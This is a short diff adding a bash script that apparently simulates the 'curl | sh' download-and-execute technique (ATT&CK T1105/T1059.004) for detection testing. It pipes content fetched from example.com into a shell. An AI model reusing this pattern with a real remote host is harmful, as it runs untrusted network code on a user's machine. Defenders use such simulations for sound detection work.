@@ -1,0 +1,8 @@
+#!/bin/bash
+
+echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92m[T1105 / T1059.004] Ingress tool transfer: downloading a remote script and piping it straight into a shell (curl | sh). This 'download-and-execute' pattern is a very common initial-access and dropper technique.\033[m"
+# SIMULATION ONLY: fetches static, harmless HTML from example.com and pipes it to
+# sh. The curl->sh process lineage is the detection signal; example.com's content
+# contains no executable commands, so nothing harmful can run.
+curl -s -m3 https://example.com/ 2>/dev/null | sh 2>/dev/null
+echo "(simulated curl | sh — fetched benign static content)"
